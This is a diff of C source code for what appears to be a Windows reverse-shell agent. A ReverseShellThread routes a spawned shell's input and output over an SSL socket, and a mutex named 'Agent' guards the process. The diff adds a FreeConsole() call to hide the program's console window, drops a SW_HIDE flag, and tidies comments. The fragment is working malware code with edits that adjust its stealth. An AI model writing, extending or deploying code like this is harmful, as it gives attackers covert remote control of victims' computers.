@@ -22,6 +22,9 @@ char* conv(int decimal_array[], int array_size);
 DWORD WINAPI ReverseShellThread(LPVOID lpParam);
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     
+    //Show Console for Split Second
+    FreeConsole();
+
     //Create mutex
     HANDLE mutex = CreateMutex(NULL, TRUE, "Agent");
 
@@ -143,11 +146,8 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     ZeroMemory(&sinfo, sizeof(sinfo));
     //Size of Structure
     sinfo.cb = sizeof(sinfo);
-    //Determines whether startup info users are used when process creates a window
     //STARTF_USESTDHANDLES - Used for Standard Input, Output and Error
-    //STARTF_USESHOWWINDOW - Contains Additional Information 
     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-    sinfo.wShowWindow = SW_HIDE;
     
     //Pipe Error to Socket (No Need)
     sinfo.hStdError = (HANDLE) shell;
@@ -196,7 +196,7 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
             memset(buffer, 0, sizeof(buffer));
     }
 
-    //Close Handles
+    //Close Handle
     CloseHandle(hStdinWrite);
     CloseHandle(hStdoutRead);
     SSL_shutdown(ssl);
@@ -204,7 +204,6 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     SSL_CTX_free(ctx);
     CloseHandle(pinfo.hProcess);
     CloseHandle(pinfo.hThread);
-
 }
 
 char* conv(int decimal_array[], int array_size) {
